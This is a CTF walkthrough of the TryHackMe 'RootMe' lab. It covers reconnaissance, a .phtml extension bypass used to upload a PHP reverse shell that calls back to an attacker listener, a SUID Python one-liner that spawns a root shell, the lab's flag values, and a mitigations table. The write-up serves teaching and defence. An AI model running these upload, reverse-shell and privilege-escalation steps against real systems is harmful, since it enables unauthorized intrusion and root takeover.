## ⚡ TL;DR

A file upload panel at `/panel/` blocked `.php` but accepted `.phtml`, landing a `www-data` shell. SUID enumeration surfaced an unusual find: `/usr/bin/python2.7` with the SUID bit set — something that should never exist outside a CTF. A single Python one-liner spawned a root shell.

---

## 📖 Introduction

Today's patient is **RootMe** — a box that tells you exactly what to do right there in the name and then helpfully leaves the door ajar. It's a deceptively clean machine: just a web upload panel, a woefully incomplete file extension filter, and a Python interpreter that someone left running with root-level permissions. The escalation path is about as subtle as a flashing arrow labelled "this way to root." The real lesson here isn't the exploit — it's learning to spot the one file in a thousand-line SUID dump that genuinely shouldn't be there.

### Prerequisites

Readers are assumed to know:

- What file upload vulnerabilities are and why extension filtering matters
- How to catch a reverse shell with Netcat
- What SUID binaries are and why they matter for privilege escalation
- Basic Python one-liners for shell spawning

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.49.157.64 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Two ports again. Nmap notes the `PHPSESSID` cookie is missing the `HttpOnly` flag — same pattern as Neighbour, same implication: this is a PHP application and session security was not a priority. The HTTP title is `HackIT - Home`, which radiates beginner CTF energy.

### Web Directory Enumeration

*(~3 mins into the box)*

*Feroxbuster with PHP, TXT, and HTML extensions:*

```bash
feroxbuster -u http://10.49.157.64 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
200  http://10.49.157.64/index.php
301  http://10.49.157.64/panel       # ^^^ file upload panel
301  http://10.49.157.64/uploads     # ^^^ where uploaded files land
200  http://10.49.157.64/panel/index.php
```

Two finds that belong together: `/panel/` provides an upload form, `/uploads/` is the publicly browsable directory where files go. This pairing is the entire attack surface — upload a shell to `/panel/`, trigger it from `/uploads/`.

## 🚪 Foothold

*(~6 mins into the box)*

### File Upload — Extension Filter Bypass

**What is a file upload vulnerability?** Web applications that accept file uploads need to ensure users can't upload executable server-side code. A common mitigation is to filter file extensions — but as with any denylist approach, the filter is only as complete as whoever wrote it. PHP files can be executed by Apache under several extensions beyond `.php`: notably `.phtml`, `.php5`, `.phar`, and others depending on server configuration. If the filter blocks `.php` but not its siblings, the protection is cosmetic.

*Attempting the obvious upload first — `.php` extension:*

```
# upload result
PHP não é permitido!
```

Portuguese for "PHP is not allowed." The filter blocks `.php` by name, which is the most recognisable extension but not the only one Apache will execute as PHP.

*Renaming the PentestMonkey PHP reverse shell and re-uploading:*

```bash
cp php-reverse-shell.php php-reverse-shell.phtml
```

The `.phtml` upload was accepted without complaint. The filter had never heard of it.

*Setting up the listener, then navigating to the uploaded file at `/uploads/` to trigger execution:*

```bash
nc -nlvp 4444
```

```
# reverse shell callback
connect to [192.168.133.233] from (UNKNOWN) [10.49.157.64] 32968
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

*Stabilising with Python PTY:*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🐚 Shell / Access

*(~8 mins into the box)*

We land as `www-data`. Three home directories exist: `rootme`, `test`, and `ubuntu` — none readable from this account. The user flag wasn't in the obvious `/home/` locations.

*Hunting for the flag by filename:*

```bash
find / -name user.txt 2>/dev/null
```

```
/var/www/user.txt   # ^^^ non-standard location
```

```bash
cat /var/www/user.txt
```

```
THM{y0u_g0t_a_sh3ll}
```

The flag lived in the web root's parent directory rather than a home folder — a mild departure from convention that required `find` rather than a straight `cat`.

---

## 📈 Escalation

*(~10 mins into the box)*

### SUID Enumeration

**What are SUID binaries?** The Set User ID (SUID) permission bit on an executable means it runs with the *file owner's* privileges rather than the *calling user's*. When a binary owned by root has SUID set, anyone who executes it effectively runs it as root — regardless of who they are. This is intentional for specific binaries like `passwd` (which needs root to edit `/etc/shadow`) but catastrophic for general-purpose tools or interpreters.

*Finding all SUID binaries on the system:*

```bash
find / -perm -4000 -type f 2>/dev/null
```

The output is long. Most entries are expected system binaries. One entry is not:

```
-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
```

In a standard Linux installation, **interpreters never have the SUID bit set**. `python`, `perl`, `ruby`, `node` — none of them should appear in a SUID scan. When they do, it means any user can run arbitrary code as root through them.

### SUID Python — GTFOBins

The escalation is a single Python one-liner. `os.execl()` replaces the current process with a new one — `/bin/sh` — and the `-p` flag tells `sh` to preserve the effective UID (root) rather than dropping it back to the calling user's UID.

*Spawning a root shell via the SUID Python binary:*

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
# whoami
root
```

*Collecting the root flag:*

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

## 💥 Exploitation

The complete attack chain:

1. **`.phtml` upload bypass** at `/panel/` — filter blocked `.php` but not `.phtml`, landing a reverse shell as `www-data`
2. **SUID Python2.7** — interpreter with root SUID set, executed a one-liner to spawn a root shell

---

## 🐇 Rabbit Holes

### Exploring `/home/rootme/` and `/home/test/`

After landing the shell, both home directories were investigated. Neither was readable by `www-data` — permissions were locked down. `.sudo_as_admin_successful` in `/home/rootme/` is an empty marker file created when a user successfully runs `sudo` for the first time; it contains no useful information. The user flag ultimately wasn't in either home directory anyway.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{y0u_g0t_a_sh3ll}` | `/var/www/user.txt` |
| Root | `THM{pr1v1l3g3_3sc4l4t10n}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| File upload filter — `.phtml` not blocked | High | Use a strict allowlist of safe extensions (`.jpg`, `.png`, `.pdf` only); validate file content via magic bytes, not just the name; store uploads outside the webroot or disable PHP execution in the uploads directory via Apache config |
| SUID bit set on Python interpreter | Critical | Remove the SUID bit immediately: `chmod u-s /usr/bin/python2.7`; audit all SUID binaries regularly with `find / -perm -4000`; no interpreter should ever have SUID |
| Missing `HttpOnly` flag on `PHPSESSID` | Low | Set `session.cookie_httponly = 1` in `php.ini` |
| User flag in web-accessible directory | Medium | Store flags and sensitive files outside the webroot; `/var/www/` is partially web-accessible depending on configuration |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** When reviewing SUID binaries, the question isn't "do I recognise this binary" — it's "should this binary *ever* have SUID set?" Interpreters, scripting tools, and package managers on that list are immediate red flags. A single `find / -perm -4000` run and thirty seconds on GTFOBins is often all that stands between `www-data` and root.

---

## 🔁 If I Did It Again

Run the SUID search before looking for other escalation vectors — on this box it was the very first thing that mattered, and filtering the output mentally for "things that should never have SUID" is a skill worth drilling until it's automatic.
